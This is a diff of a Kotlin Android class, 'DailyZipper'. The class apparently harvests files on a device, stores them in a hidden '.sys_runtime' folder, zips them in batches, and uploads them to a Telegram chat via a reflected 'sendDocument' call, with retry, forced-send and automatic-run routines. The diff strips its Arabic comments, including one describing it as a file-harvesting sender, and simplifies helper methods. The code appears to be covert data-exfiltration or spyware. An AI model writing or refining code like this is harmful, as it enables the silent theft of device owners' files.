@@ -23,10 +23,6 @@ import java.util.concurrent.atomic.AtomicBoolean
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
-/**
- * فئة تجميع الملفات وحصادها بضغطها في ملفات ZIP وإرسالها بطريقة آمنة وفعالة.
- * تم إعادة كتابتها بالكامل لضمان عدم وجود أي استخدام للأقواس المربعة.
- */
 class DailyZipper(
     context: Context,
     private val scanner: Any? = null,
@@ -43,7 +39,6 @@ class DailyZipper(
 
     private var maxBatchSize = 48L * 1024L * 1024L // 48MB
 
-    // ========== المسارات والملفات ==========
     private val runtimeDir: File by lazy {
         File(appContext?.filesDir, ".sys_runtime").apply {
             if (!exists()) mkdirs()
@@ -94,30 +89,28 @@ class DailyZipper(
         loadConfig()
     }
 
-    // ========== دوال مساعدة آمنة للخرائط (بدون أي [] أو .get) ==========
+    // ========== دوال مساعدة آمنة تماماً ==========
     private fun getMapValue(map: Any?, key: String): Any? {
-        return if (map is Map<*, *>) {
+        if (map is Map<*, *>) {
             for (entry in map.entries) {
                 if (entry.key?.toString() == key) {
                     return entry.value
                 }
             }
-            null
-        } else {
-            null
         }
+        return null
     }
 
-    private fun getMapBoolean(map: Any?, key: String, default: Boolean = false): Boolean {
+    private fun getMapBoolean(map: Any?, key: String): Boolean {
         val value = getMapValue(map, key)
         return when (value) {
             true, "true", 1, "1" -> true
-            else -> default
+            else -> false
         }
     }
 
-    private fun getMapString(map: Any?, key: String, default: String = ""): String {
-        return getMapValue(map, key)?.toString() ?: default
+    private fun getMapString(map: Any?, key: String): String {
+        return getMapValue(map, key)?.toString() ?: ""
     }
 
     @Suppress("UNCHECKED_CAST")
@@ -162,10 +155,6 @@ class DailyZipper(
         val maxBatches: Int
     )
 
-    // ============================================================
-    //  إدارة التكوين والإعدادات
-    // ============================================================
-
     private fun loadConfig() {
         if (!configFile.exists()) {
             saveConfig()
@@ -199,10 +188,6 @@ class DailyZipper(
         }
     }
 
-    // ============================================================
-    //  الأدوات وفحوصات النظام
-    // ============================================================
-
     private fun getDeviceTag(): String {
         val ctx = appContext
         if (ctx != null) {
@@ -235,10 +220,6 @@ class DailyZipper(
             true
         }
     }
-
-    // ============================================================
-    //  أدوات الملفات والتجزئة
-    // ============================================================
 
     private fun fileHash(file: File): String? {
         if (!file.exists() || !file.isFile) return null
@@ -275,10 +256,6 @@ class DailyZipper(
         }
     }
 
-    // ============================================================
-    //  فحص الشبكة
-    // ============================================================
-
     private fun isOnWifi(): Boolean {
         val ctx = appContext ?: return true
         val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return true
@@ -290,10 +267,6 @@ class DailyZipper(
             true
         }
     }
-
-    // ============================================================
-    //  إرسال الملفات مع إعادة المحاولة (باستخدام دوال مساعدة آمنة)
-    // ============================================================
 
     private suspend fun safeSend(
         zipPath: String,
@@ -325,7 +298,7 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                val isOk = getMapBoolean(result, "ok", false)
+                val isOk = getMapBoolean(result, "ok")
                 if (isOk) {
                     return true
                 }
@@ -339,10 +312,6 @@ class DailyZipper(
         }
         return false
     }
-
-    // ============================================================
-    //  إجبار الإرسال الفوري
-    // ============================================================
 
     fun forceSendNow(chatId: Long? = null): Boolean {
         scope.launch {
@@ -391,10 +360,6 @@ class DailyZipper(
         }
         return true
     }
-
-    // ============================================================
-    //  الضغط والتغليف والتحزيم
-    // ============================================================
 
     private suspend fun packAndShip(
         files: List<File>,
@@ -590,10 +555,6 @@ class DailyZipper(
         }
     }
 
-    // ============================================================
-    //  إنشاء أرشيف ZIP
-    // ============================================================
-
     private fun createZipArchive(
         zipFile: File,
         files: List<File>,
@@ -635,10 +596,6 @@ class DailyZipper(
             false
         }
     }
-
-    // ============================================================
-    //  التشغيل التلقائي (باستخدام دوال مساعدة آمنة)
-    // ============================================================
 
     fun run(): Boolean {
         scope.launch {
@@ -701,10 +658,6 @@ class DailyZipper(
         return true
     }
 
-    // ============================================================
-    //  أدوات مساعدة والإحصائيات
-    // ============================================================
-
     fun clearHashCache() {
         processedHashes.clear()
     }
@@ -729,10 +682,6 @@ class DailyZipper(
         result.put("size", totalSize)
         return result
     }
-
-    // ============================================================
-    //  دوال المساعدة والتواصل (Reflection Helpers)
-    // ============================================================
 
     private fun sendMessage(chatId: Long, text: String) {
         if (telegram == null) return
